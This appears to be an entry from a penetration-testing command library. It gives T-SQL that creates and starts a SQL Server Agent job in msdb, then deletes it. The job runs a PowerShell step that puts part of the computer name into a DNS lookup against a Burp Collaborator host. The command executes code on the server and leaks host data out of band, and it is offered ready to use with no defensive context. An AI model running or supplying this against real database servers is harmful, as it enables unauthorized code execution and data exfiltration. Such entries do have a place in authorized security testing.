---
id: 78c14d37-af20-434a-a456-b7113d4b4540
name: Create PowerShell job and execute nslookup command
type: command
executor: bash
data: "USE msdb; \nEXEC dbo.sp_add_job @job_name = N'test_powershell_job1'; \nEXEC\
  \ sp_add_jobstep @job_name = N'test_powershell_job1', @step_name = N'test_powershell_name1',\
  \ @subsystem = N'PowerShell', @command = N'$name=$env:COMPUTERNAME[10];nslookup\
  \ \"$name.redacted.burpcollaborator.net\"', @retry_attempts = 1, @retry_interval\
  \ = 5 ;\nEXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job1'; \nEXEC dbo.sp_start_job\
  \ N'test_powershell_job1';\n\n-- delete\nEXEC dbo.sp_delete_job @job_name = N'test_powershell_job1';"
output: null
created_at: '2023-04-06T03:56:20.520654+00:00'
updated_at: '2023-04-10T20:36:46.496730+00:00'
---

# Create PowerShell job and execute nslookup command

```bash
USE msdb; 
EXEC dbo.sp_add_job @job_name = N'test_powershell_job1'; 
EXEC sp_add_jobstep @job_name = N'test_powershell_job1', @step_name = N'test_powershell_name1', @subsystem = N'PowerShell', @command = N'$name=$env:COMPUTERNAME[10];nslookup "$name.redacted.burpcollaborator.net"', @retry_attempts = 1, @retry_interval = 5 ;
EXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job1'; 
EXEC dbo.sp_start_job N'test_powershell_job1';

-- delete
EXEC dbo.sp_delete_job @job_name = N'test_powershell_job1';
```


